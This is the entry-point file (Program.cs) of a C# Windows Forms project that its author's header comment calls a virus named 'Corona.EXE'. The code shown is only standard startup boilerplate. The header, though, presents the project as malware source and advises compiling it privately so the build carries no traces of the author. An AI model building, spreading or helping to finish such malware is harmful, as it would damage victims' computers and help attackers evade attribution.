using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Reflection;

/*
 
                ██████╗ ██████╗ ██████╗  ██████╗ ███╗   ██╗ █████╗    ███████╗██╗  ██╗███████╗
                ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗████╗  ██║██╔══██╗   ██╔════╝╚██╗██╔╝██╔════╝
                ██║     ██║   ██║██████╔╝██║   ██║██╔██╗ ██║███████║   █████╗   ╚███╔╝ █████╗  
                ██║     ██║   ██║██╔══██╗██║   ██║██║╚██╗██║██╔══██║   ██╔══╝   ██╔██╗ ██╔══╝  
                ╚██████╗╚██████╔╝██║  ██║╚██████╔╝██║ ╚████║██║  ██║██╗███████╗██╔╝ ██╗███████╗

  -=========================================================================================================-
    * Author : Zenix-Owler 

    * Github : https://github.com/Zenix-Owler

    * Disclaimer : I only make this virus for fun, i do not encourage anyone to publish or spread it out for malicious purposes,
    That's why i don't publish the compiled executable but the source codes instead, if one wish to try it out, compile it through
    Visual studio so the executables won't have tracks of me like time and date that it was created and so on, hence it'll be the 
    proof if anyone is intending to abuse it to cause chaos but not me. Therefore, i won't be responsible for any action of yours.
           
        - Copyright © 2020 Hackernese -

  -=========================================================================================================-
 */
namespace Corona.EXE
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]        

        static void Main()
        {

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());

        }
    }
}
